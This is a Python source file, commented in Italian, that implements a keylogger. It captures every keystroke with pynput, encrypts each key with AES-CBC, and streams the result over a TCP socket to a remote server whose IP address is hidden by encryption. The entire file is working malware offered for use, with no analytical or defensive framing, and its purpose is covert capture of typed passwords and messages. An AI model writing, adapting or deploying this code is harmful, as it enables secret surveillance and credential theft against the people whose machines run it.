from pynput import keyboard
import socket
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64
import os

# Funzioni per crittografare e decrittografare usando AES in modalità CBC
def pad(data: bytes) -> bytes:
    """Aggiunge padding PKCS#7."""
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([pad_len] * pad_len)

def unpad(data: bytes) -> bytes:
    """Rimuove il padding PKCS#7."""
    pad_len = data[-1]
    if pad_len < 1 or pad_len > AES.block_size or data[-pad_len:] != bytes([pad_len] * pad_len):
        raise ValueError("Padding non valido")
    return data[:-pad_len]

def encrypt_aes_cbc(key: bytes, plaintext: str) -> str:
    """Crittografia AES-CBC con IV casuale."""
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext.encode('utf-8')))
    return base64.b64encode(iv + ciphertext).decode('utf-8')

def decrypt_aes_cbc(key: bytes, encrypted_data: str) -> str:
    """Decrittografia AES-CBC con controllo errori."""
    try:
        encrypted_data = base64.b64decode(encrypted_data)
        iv, ciphertext = encrypted_data[:AES.block_size], encrypted_data[AES.block_size:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        plaintext = unpad(cipher.decrypt(ciphertext))
        return plaintext.decode('utf-8')
    except Exception as e:
        raise ValueError(f"Decrypt error: {str(e)}")

# Configurazione
SERVER_PORT = 65432  # Porta del server AES-CBC
ENCRYPTED_IP = "5n7PN/eq6tPEdi/VuZCfL6PlHOgN3C250BUIsAqlkTU="  # Sostituisci con l'IP crittografato
AES_KEY = os.getenv('AES_KEY')  # Chiave AES dalla variabile d'ambiente

if not AES_KEY:
    raise ValueError("Chiave AES non trovata nelle variabili d'ambiente!")

# Decrittografa l'indirizzo IP del server
server_ip = decrypt_aes_cbc(bytes.fromhex(AES_KEY), ENCRYPTED_IP)
print(f"IP decrittografato: {server_ip}")

# Socket globale per la connessione al server
client_socket = None

def handle_keys(key: keyboard.Key):
    """Gestisce la pressione dei tasti e invia i dati cifrati al server."""
    global client_socket
    try:
        # Mappa i tasti speciali
        if key == keyboard.Key.space:
            k = " "
        elif key == keyboard.Key.enter:
            k = "\n"
        elif key == keyboard.Key.alt:
            k = "<Alt>"
        elif hasattr(key, 'char') and key.char is not None:
            k = key.char
        else:
            k = "<" + str(key).split(".")[1] + ">"

        # Crittografia del tasto premuto
        encrypted_key = encrypt_aes_cbc(bytes.fromhex(AES_KEY), k)
        
        # Invia il tasto cifrato al server
        if client_socket:
            client_socket.sendall((encrypted_key + "\n").encode('utf-8'))
    except Exception as e:
        print(f"Errore nell'invio dei dati: {e}")

def start_keylogger():
    """Avvia il keylogger e si connette al server."""
    global client_socket
    try:
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client_socket.connect((server_ip, SERVER_PORT))
        print("Connessione al server riuscita.")

        # Avvia il listener della tastiera
        listener = keyboard.Listener(on_press=handle_keys)
        listener.start()
        listener.join()  # Mantiene il listener in esecuzione
    except Exception as e:
        print(f"Errore nella connessione al server: {e}")
    finally:
        if client_socket:
            client_socket.close()

if __name__ == "__main__":
    start_keylogger()